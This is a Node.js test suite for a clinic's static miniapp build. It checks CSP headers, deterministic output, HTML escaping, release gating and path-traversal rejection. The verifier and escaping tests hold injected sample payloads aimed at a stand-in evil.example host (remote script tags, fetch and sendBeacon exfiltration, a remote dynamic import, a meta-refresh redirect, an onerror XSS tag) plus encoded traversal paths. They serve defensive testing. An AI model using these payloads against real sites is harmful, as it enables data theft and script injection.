import assert from 'node:assert/strict';
import {
  existsSync,
  mkdirSync,
  mkdtempSync,
  readFileSync,
  readdirSync,
  rmSync,
  writeFileSync,
} from 'node:fs';
import { tmpdir } from 'node:os';
import { basename, join, relative } from 'node:path';
import test from 'node:test';
import { fileURLToPath } from 'node:url';

const projectRoot = fileURLToPath(new URL('..', import.meta.url));
const buildModuleUrl = new URL('../scripts/build-miniapps.mjs', import.meta.url);
const serveModuleUrl = new URL('../scripts/serve-miniapps.mjs', import.meta.url);
const allowedMiniapps = ['clinic-guide', 'healthy-recipes'];
const requiredCsp = {
  'default-src': ["'self'"],
  'script-src': ["'self'"],
  'style-src': ["'self'"],
  'img-src': ["'self'"],
  'connect-src': ["'none'"],
  'font-src': ["'self'"],
  'frame-src': ["'none'"],
  'object-src': ["'none'"],
  'form-action': ["'none'"],
  'base-uri': ["'none'"],
  'worker-src': ["'none'"],
  'media-src': ["'none'"],
};

function read(relativePath) {
  return readFileSync(join(projectRoot, relativePath), 'utf8');
}

function readJson(relativePath) {
  return JSON.parse(read(relativePath));
}

function walk(root) {
  if (!existsSync(root)) return [];
  const files = [];
  for (const entry of readdirSync(root, { withFileTypes: true }).sort((a, b) => a.name.localeCompare(b.name))) {
    const path = join(root, entry.name);
    if (entry.isDirectory()) files.push(...walk(path));
    else if (entry.isFile()) files.push(path);
  }
  return files;
}

function byteInventory(root) {
  return walk(root).map((path) => ({
    path: relative(root, path).replaceAll('\\', '/'),
    bytes: readFileSync(path).toString('base64'),
  }));
}

function parseCsp(value) {
  return Object.fromEntries(value.split(';').map((part) => part.trim()).filter(Boolean).map((part) => {
    const [name, ...tokens] = part.split(/\s+/u);
    return [name, tokens];
  }));
}

function exactConfirmedFacts() {
  const confirmedSource = {
    sourceUrl: 'https://cabohealth.org/contact-source/',
    sourceStatus: 'owner-confirmed-source',
  };
  return {
    status: 'owner-confirmed',
    ownerConfirmedAt: '2026-08-16T18:30:00.000Z',
    facts: {
      publicEmail: { value: 'hello@example.test', ...confirmedSource },
      phone: { value: '+526241234567', ...confirmedSource },
      whatsApp: { value: 'https://wa.me/526241234567', ...confirmedSource },
      address: { value: 'Confirmed clinic address', ...confirmedSource },
      hours: { value: 'Confirmed clinic hours', ...confirmedSource },
      appleMapsDestination: { value: 'https://maps.apple.com/?address=Confirmed%20Clinic', ...confirmedSource },
      serviceLanguages: { value: ['English', 'Español'], ...confirmedSource },
    },
  };
}

async function withHealthyBuild(assertion) {
  const tempRoot = mkdtempSync(join(tmpdir(), 'cabohealth-miniapps-'));
  const outputRoot = join(tempRoot, 'dist');
  try {
    const { buildMiniapps } = await import(buildModuleUrl.href);
    await buildMiniapps({ projectRoot, outputRoot, mode: 'healthy' });
    await assertion(outputRoot);
  } finally {
    rmSync(tempRoot, { recursive: true, force: true });
  }
}

test('source registry contains only the two approved miniapps and the required local shared files', () => {
  const miniappsRoot = join(projectRoot, 'miniapps');
  const actualMiniapps = existsSync(miniappsRoot)
    ? readdirSync(miniappsRoot, { withFileTypes: true })
      .filter((entry) => entry.isDirectory() && !['dist', 'shared'].includes(entry.name))
      .map(({ name }) => name)
      .sort()
    : [];
  assert.deepEqual(actualMiniapps, allowedMiniapps);

  for (const relativePath of [
    'miniapps/shared/styles.css',
    'miniapps/shared/motion.js',
    'miniapps/shared/shell.js',
    'miniapps/shared/logo.png',
    'miniapps/shared/security-headers.conf',
    'miniapps/healthy-recipes/index.html',
    'miniapps/healthy-recipes/app.js',
    'miniapps/clinic-guide/index.html',
    'miniapps/clinic-guide/app.js',
    'web-hosting/cabohealth.org/apps/.htaccess',
  ]) {
    assert.ok(existsSync(join(projectRoot, relativePath)), `missing ${relativePath}`);
  }
});

test('healthy-only build is byte-for-byte deterministic and emits no deployable Clinic Guide', async () => {
  const { buildMiniapps } = await import(buildModuleUrl.href);
  const firstRoot = mkdtempSync(join(tmpdir(), 'cabohealth-miniapps-a-'));
  const secondRoot = mkdtempSync(join(tmpdir(), 'cabohealth-miniapps-b-'));
  try {
    await buildMiniapps({ projectRoot, outputRoot: firstRoot, mode: 'healthy' });
    await buildMiniapps({ projectRoot, outputRoot: secondRoot, mode: 'healthy' });
    assert.deepEqual(byteInventory(firstRoot), byteInventory(secondRoot));

    assert.ok(existsSync(join(firstRoot, 'apps/healthy-recipes/index.html')));
    assert.equal(existsSync(join(firstRoot, 'apps/clinic-guide/index.html')), false);
    assert.deepEqual(
      walk(join(firstRoot, 'apps'))
        .filter((path) => basename(path) === 'index.html')
        .map((path) => relative(join(firstRoot, 'apps'), path).replaceAll('\\', '/')),
      ['healthy-recipes/index.html'],
    );
  } finally {
    rmSync(firstRoot, { recursive: true, force: true });
    rmSync(secondRoot, { recursive: true, force: true });
  }
});

test('generated Healthy Recipes document is complete without JavaScript and has exact safe navigation', async () => {
  await withHealthyBuild(async (outputRoot) => {
    const html = readFileSync(join(outputRoot, 'apps/healthy-recipes/index.html'), 'utf8');
    const recipes = readJson('content/recipes.json');

    assert.match(html, /^<!doctype html>\n<html lang="en">/u);
    assert.equal((html.match(/<title>/gu) ?? []).length, 1);
    assert.match(html, /<title>Healthy Recipes \| CaboHealth<\/title>/u);
    assert.match(html, /<meta name="description" content="[^"]+">/u);
    assert.match(html, /<link rel="canonical" href="https:\/\/cabohealth\.org\/apps\/healthy-recipes\/">/u);
    assert.match(html, /<a class="skip-link" href="#main-content">/u);
    assert.equal((html.match(/<main\b/gu) ?? []).length, 1);
    assert.equal((html.match(/<h1\b/gu) ?? []).length, 1);
    assert.match(html, /data-language="en"[^>]*aria-pressed="true"/u);
    assert.match(html, /data-language="es-MX"[^>]*aria-pressed="false"/u);
    assert.match(html, /aria-live="polite"/u);
    assert.equal((html.match(/data-recipe-slug="/gu) ?? []).length, 12);
    assert.doesNotMatch(html, /<form\b|<textarea\b|type="file"/iu);

    for (const recipe of recipes.recipes) {
      const start = html.indexOf(`data-recipe-slug="${recipe.slug}"`);
      const next = html.indexOf('data-recipe-slug="', start + 1);
      const article = html.slice(start, next === -1 ? html.length : next);
      assert.ok(start >= 0, `missing recipe ${recipe.slug}`);
      assert.match(article, /lang="en" data-locale="en"/u);
      assert.match(article, /lang="es-MX" data-locale="es-MX"/u);
      assert.doesNotMatch(article, /\shidden(?:\s|=|>)/u);
      assert.ok(article.includes(recipe.ingredients.en[0]), `${recipe.slug} English ingredients missing`);
      assert.ok(article.includes(recipe.ingredients['es-MX'][0]), `${recipe.slug} Spanish ingredients missing`);
      assert.ok(article.includes(recipe.steps.en[0]), `${recipe.slug} English steps missing`);
      assert.ok(article.includes(recipe.steps['es-MX'][0]), `${recipe.slug} Spanish steps missing`);
    }

    assert.match(html, /Spinach &amp; Egg Corn Tacos/u);
    assert.match(html, /<a href="https:\/\/cabohealth\.org\/app\/privacy\/">Privacy<\/a>/u);
    assert.match(html, /<a href="https:\/\/cabohealth\.org\/app\/terms\/">Terms<\/a>/u);
    assert.match(html, /<a href="https:\/\/cabohealth\.org\/app\/support\/">Support<\/a>/u);
    assert.match(html, /<a href="https:\/\/cabohealth\.org\/app\/report-content\/">Report Content<\/a>/u);
    assert.doesNotMatch(html, /target\s*=|window\.open|https:\/\/www\.who\.int|https:\/\/www\.foodsafety\.gov|https:\/\/www\.fsis\.usda\.gov/iu);
  });
});

test('generated HTML and Apache configuration carry equivalent strict CSP', async () => {
  await withHealthyBuild(async (outputRoot) => {
    const html = readFileSync(join(outputRoot, 'apps/healthy-recipes/index.html'), 'utf8');
    const headers = readFileSync(join(outputRoot, 'apps/.htaccess'), 'utf8');
    const metaMatch = html.match(/<meta http-equiv="Content-Security-Policy" content="([^"]+)">/u);
    const headerMatch = headers.match(/Header always set Content-Security-Policy "([^"]+)"/u);
    assert.ok(metaMatch, 'missing CSP meta');
    assert.ok(headerMatch, 'missing CSP server header');
    assert.equal(metaMatch[1], headerMatch[1]);
    assert.deepEqual(parseCsp(metaMatch[1]), requiredCsp);
    assert.doesNotMatch(metaMatch[1], /unsafe-inline|unsafe-eval|data:|blob:|https?:/iu);
  });
});

test('artifact verifier rejects remote resources, active exfiltration, forms, popups and CSP drift', async () => {
  const { verifyBuiltArtifact } = await import(buildModuleUrl.href);
  const mutations = [
    ['remote script', 'index.html', '</body>', '<script src="https://evil.example/x.js"></script></body>'],
    ['remote image', 'index.html', '</body>', '<img src="//evil.example/x.png" alt=""></body>'],
    ['remote srcset', 'index.html', '</body>', '<img src="../shared/logo.png" srcset="https://evil.example/x.png 2x" alt=""></body>'],
    ['popup', 'index.html', 'href="https://cabohealth.org/app/privacy/"', 'target="_blank" href="https://cabohealth.org/app/privacy/"'],
    ['unquoted popup', 'index.html', 'href="https://cabohealth.org/app/privacy/"', 'target=_blank href="https://cabohealth.org/app/privacy/"'],
    ['form', 'index.html', '</body>', '<form action="/collect"><input name="name"></form></body>'],
    ['meta refresh', 'index.html', '</head>', '<meta http-equiv="refresh" content="0;url=https://evil.example"></head>'],
    ['unquoted meta refresh', 'index.html', '</head>', '<meta http-equiv=refresh content="0;url=https://evil.example"></head>'],
    ['inline style element', 'index.html', '</head>', '<style>.x{background:url(https://evil.example/x.png)}</style></head>'],
    ['fetch', 'app.js', '', '\nfetch("https://evil.example/data");'],
    ['xhr', 'app.js', '', '\nnew XMLHttpRequest();'],
    ['worker', 'app.js', '', '\nnew Worker("worker.js");'],
    ['window open', 'app.js', '', '\nwindow.open("/");'],
    ['direct location redirect', 'app.js', '', '\nlocation = "https://evil.example/";'],
    ['send beacon', 'app.js', '', '\nnavigator.sendBeacon("https://evil.example/", "x");'],
    ['dynamic import', 'app.js', '', '\nimport("https://evil.example/module.js");'],
    ['css url', 'styles.css', '', '\n.x{background:url(https://evil.example/x.png)}'],
    ['css import', 'styles.css', '', '\n@import "https://evil.example/x.css";'],
    ['weakened CSP', 'index.html', "connect-src 'none'", "connect-src 'self'"],
  ];

  for (const [label, relativePath, needle, replacement] of mutations) {
    await withHealthyBuild(async (outputRoot) => {
      const path = relativePath === 'index.html'
        ? join(outputRoot, 'apps/healthy-recipes/index.html')
        : relativePath === 'app.js'
          ? join(outputRoot, 'apps/healthy-recipes/app.js')
          : join(outputRoot, 'apps/shared/styles.css');
      const original = readFileSync(path, 'utf8');
      writeFileSync(path, needle ? original.replace(needle, replacement) : original + replacement);
      assert.throws(
        () => verifyBuiltArtifact({ outputRoot, expectedEntrySlugs: ['healthy-recipes'] }),
        undefined,
        label,
      );
    });
  }
});

test('renderer HTML-escapes canonical content before it reaches the static document', async () => {
  const { renderHealthyRecipesDocument } = await import(buildModuleUrl.href);
  const content = readJson('content/recipes.json');
  content.recipes[0].summary.en = '<img src="https://evil.example/x" onerror="alert(1)">';
  const html = renderHealthyRecipesDocument(
    read('miniapps/healthy-recipes/index.html'),
    content,
  );
  assert.doesNotMatch(html, /<img src="https:\/\/evil\.example/u);
  assert.match(html, /&lt;img src=&quot;https:\/\/evil\.example\/x&quot; onerror=&quot;alert\(1\)&quot;&gt;/u);
});

test('production build rejects every incomplete or malformed owner-fact record', async () => {
  const { validatePublicContactFacts } = await import(buildModuleUrl.href);
  const valid = exactConfirmedFacts();
  assert.deepEqual(validatePublicContactFacts(valid), []);

  const invalidRecords = [];
  for (const omitted of Object.keys(valid.facts)) {
    const record = structuredClone(valid);
    delete record.facts[omitted];
    invalidRecords.push(record);
  }
  const extra = structuredClone(valid);
  extra.facts.extraContact = structuredClone(valid.facts.phone);
  invalidRecords.push(extra);
  invalidRecords.push({ ...structuredClone(valid), status: 'awaiting-owner-confirmation' });
  invalidRecords.push({ ...structuredClone(valid), ownerConfirmedAt: 'not-a-timestamp' });

  const badSource = structuredClone(valid);
  badSource.facts.phone.sourceUrl = ' http://cabohealth.org/contact/ ';
  invalidRecords.push(badSource);
  const badSourceStatus = structuredClone(valid);
  badSourceStatus.facts.hours.sourceStatus = 'owner-confirmation-required';
  invalidRecords.push(badSourceStatus);
  const blankLanguages = structuredClone(valid);
  blankLanguages.facts.serviceLanguages.value = ['English', ' '];
  invalidRecords.push(blankLanguages);

  for (const [index, record] of invalidRecords.entries()) {
    assert.notDeepEqual(validatePublicContactFacts(record), [], `invalid record ${index} passed`);
  }
});

test('production build fails closed before touching output while owner facts or Task 6B are pending', async () => {
  const { buildMiniapps } = await import(buildModuleUrl.href);
  const tempRoot = mkdtempSync(join(tmpdir(), 'cabohealth-release-gate-'));
  const outputRoot = join(tempRoot, 'dist');
  mkdirSync(outputRoot);
  writeFileSync(join(outputRoot, 'sentinel.txt'), 'preserve me\n');
  try {
    await assert.rejects(
      buildMiniapps({ projectRoot, outputRoot, mode: 'release' }),
      /PUBLIC_CONTACT_FACTS_INCOMPLETE/u,
    );
    assert.equal(readFileSync(join(outputRoot, 'sentinel.txt'), 'utf8'), 'preserve me\n');

    await assert.rejects(
      buildMiniapps({ projectRoot, outputRoot, mode: 'release', contactFacts: exactConfirmedFacts() }),
      /CLINIC_GUIDE_TASK_6B_PENDING/u,
    );
    assert.equal(readFileSync(join(outputRoot, 'sentinel.txt'), 'utf8'), 'preserve me\n');
  } finally {
    rmSync(tempRoot, { recursive: true, force: true });
  }
});

test('builder refuses a broad output target outside the exact dist or isolated temp scope', async () => {
  const { assertSafeMiniappOutputPath } = await import(buildModuleUrl.href);
  assert.throws(
    () => assertSafeMiniappOutputPath({ projectRoot, outputRoot: projectRoot }),
    /unsafe miniapp output path/iu,
  );
  assert.throws(
    () => assertSafeMiniappOutputPath({ projectRoot, outputRoot: '/tmp' }),
    /unsafe miniapp output path/iu,
  );
  assert.equal(
    assertSafeMiniappOutputPath({ projectRoot, outputRoot: join(projectRoot, 'miniapps/dist') }),
    join(projectRoot, 'miniapps/dist'),
  );
});

test('network motion policy caps rendering and stops its single scheduler cleanly', async () => {
  const motionSource = read('miniapps/shared/motion.js');
  const {
    computeCanvasBackingStore,
    createFrameScheduler,
    deriveNetworkMotionState,
  } = await import(`data:text/javascript;base64,${Buffer.from(motionSource).toString('base64')}`);

  assert.equal(deriveNetworkMotionState({ ready: true, pageVisible: true, effectVisible: true, pausedByUser: false, reducedMotion: false, saveData: false }), 'playing');
  assert.equal(deriveNetworkMotionState({ ready: true, pageVisible: true, effectVisible: true, pausedByUser: true, reducedMotion: false, saveData: false }), 'paused');
  assert.equal(deriveNetworkMotionState({ ready: true, pageVisible: false, effectVisible: true, pausedByUser: false, reducedMotion: false, saveData: false }), 'waiting');
  assert.equal(deriveNetworkMotionState({ ready: true, pageVisible: true, effectVisible: true, pausedByUser: false, reducedMotion: true, saveData: false }), 'blocked');
  assert.equal(deriveNetworkMotionState({ ready: true, pageVisible: true, effectVisible: true, pausedByUser: false, reducedMotion: false, saveData: true }), 'blocked');

  assert.deepEqual(computeCanvasBackingStore({ cssWidth: 400, cssHeight: 200, devicePixelRatio: 3 }), {
    width: 600,
    height: 300,
    scale: 1.5,
  });
  const constrained = computeCanvasBackingStore({ cssWidth: 2400, cssHeight: 1600, devicePixelRatio: 3 });
  assert.ok(constrained.scale <= 1.5);
  assert.ok(constrained.width * constrained.height <= 1_500_000);

  let nextId = 0;
  const callbacks = new Map();
  const draws = [];
  const canceled = [];
  const scheduler = createFrameScheduler({
    targetFps: 30,
    canRender: () => true,
    draw: ({ now, deltaMs }) => draws.push({ now, deltaMs }),
    requestFrame: (callback) => {
      const id = ++nextId;
      callbacks.set(id, callback);
      return id;
    },
    cancelFrame: (id) => {
      canceled.push(id);
      callbacks.delete(id);
    },
  });
  const present = (now) => {
    const [id, callback] = callbacks.entries().next().value;
    callbacks.delete(id);
    callback(now);
  };

  scheduler.start();
  present(0);
  present(10);
  present(34);
  present(1000);
  assert.deepEqual(draws.map(({ now }) => now), [0, 34, 1000]);
  assert.ok(draws.every(({ deltaMs }) => deltaMs <= 50));
  assert.equal(callbacks.size, 1, 'scheduler must own one pending frame');
  scheduler.stop();
  assert.equal(callbacks.size, 0);
  assert.equal(canceled.length, 1);
});

test('network motion mounts one canvas owner and releases every runtime resource', async () => {
  class FakeEventTarget {
    constructor() {
      this.listeners = new Map();
    }

    addEventListener(type, listener) {
      const listeners = this.listeners.get(type) ?? new Set();
      listeners.add(listener);
      this.listeners.set(type, listeners);
    }

    removeEventListener(type, listener) {
      this.listeners.get(type)?.delete(listener);
    }

    listenerCount() {
      return [...this.listeners.values()].reduce((total, listeners) => total + listeners.size, 0);
    }
  }

  const motionSource = read('miniapps/shared/motion.js');
  const { mountNetworkMotion } = await import(`data:text/javascript;base64,${Buffer.from(motionSource).toString('base64')}`);
  const toggle = new FakeEventTarget();
  const status = { textContent: '' };
  const context = {
    setTransform() {}, clearRect() {}, beginPath() {}, moveTo() {}, lineTo() {}, stroke() {}, arc() {}, fill() {},
  };
  const canvas = {
    width: 0,
    height: 0,
    getContext: () => context,
    getBoundingClientRect: () => ({ width: 400, height: 200 }),
  };
  const media = Object.assign(new FakeEventTarget(), { matches: false });
  const connection = Object.assign(new FakeEventTarget(), { saveData: false });
  const view = Object.assign(new FakeEventTarget(), {
    devicePixelRatio: 3,
    navigator: { connection },
    matchMedia: () => media,
  });
  let nextFrame = 0;
  const frames = new Map();
  const canceled = [];
  view.requestAnimationFrame = (callback) => {
    const id = ++nextFrame;
    frames.set(id, callback);
    return id;
  };
  view.cancelAnimationFrame = (id) => {
    canceled.push(id);
    frames.delete(id);
  };
  let observerCallback;
  let disconnects = 0;
  view.IntersectionObserver = class {
    constructor(callback) {
      observerCallback = callback;
    }

    observe() {}

    disconnect() {
      disconnects += 1;
    }
  };
  const page = Object.assign(new FakeEventTarget(), {
    defaultView: view,
    hidden: false,
    querySelector: (selector) => ({
      '[data-network-canvas]': canvas,
      '[data-motion-toggle]': toggle,
      '[data-motion-status]': status,
    })[selector] ?? null,
  });

  const controller = mountNetworkMotion({ document: page, language: () => 'en' });
  assert.equal(mountNetworkMotion({ document: page, language: () => 'en' }), controller);
  observerCallback([{ target: canvas, isIntersecting: true, intersectionRatio: 1 }]);
  assert.equal(frames.size, 1);
  assert.deepEqual({ width: canvas.width, height: canvas.height }, { width: 600, height: 300 });

  controller.destroy();
  assert.equal(frames.size, 0);
  assert.equal(canceled.length, 1);
  assert.equal(disconnects, 1);
  assert.equal(toggle.listenerCount(), 0);
  assert.equal(page.listenerCount(), 0);
  assert.equal(media.listenerCount(), 0);
  assert.equal(connection.listenerCount(), 0);
  assert.equal(view.listenerCount(), 0);
  assert.deepEqual({ width: canvas.width, height: canvas.height }, { width: 1, height: 1 });
});

test('static request resolver serves only built local files and rejects traversal or absent routes', async () => {
  const { resolveStaticRequest } = await import(serveModuleUrl.href);
  await withHealthyBuild(async (outputRoot) => {
    assert.equal(
      resolveStaticRequest(outputRoot, '/apps/healthy-recipes/'),
      join(outputRoot, 'apps/healthy-recipes/index.html'),
    );
    assert.equal(resolveStaticRequest(outputRoot, '/apps/clinic-guide/'), null);
    assert.equal(resolveStaticRequest(outputRoot, '/../../release/public-contact-facts.json'), null);
    assert.equal(resolveStaticRequest(outputRoot, '/%2e%2e/%2e%2e/package.json'), null);
    assert.equal(resolveStaticRequest(outputRoot, '/apps/%2e%2e/manifest.json'), null);
    assert.equal(resolveStaticRequest(outputRoot, '//evil.example/x'), null);
  });
});

test('package scripts keep the full release build gated and expose the independently green slice', () => {
  const scripts = readJson('package.json').scripts;
  assert.equal(scripts['miniapps:build'], 'node scripts/build-miniapps.mjs --release');
  assert.equal(scripts['miniapps:build:healthy'], 'node scripts/build-miniapps.mjs --healthy');
  assert.equal(scripts['miniapps:serve'], 'node scripts/serve-miniapps.mjs');
  assert.equal(scripts['miniapps:verify'], 'node --test tests/miniapps-content.test.mjs tests/miniapps-build.test.mjs');
});
